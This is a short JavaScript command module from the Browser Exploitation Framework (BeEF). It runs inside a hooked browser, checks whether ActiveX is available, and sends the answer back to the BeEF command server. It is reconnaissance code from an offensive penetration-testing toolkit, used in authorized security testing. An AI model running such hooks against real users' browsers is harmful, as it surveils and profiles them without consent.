//
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var result = (beef.browser.hasActiveX())? "Yes" : "No";

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "activex="+result);

});

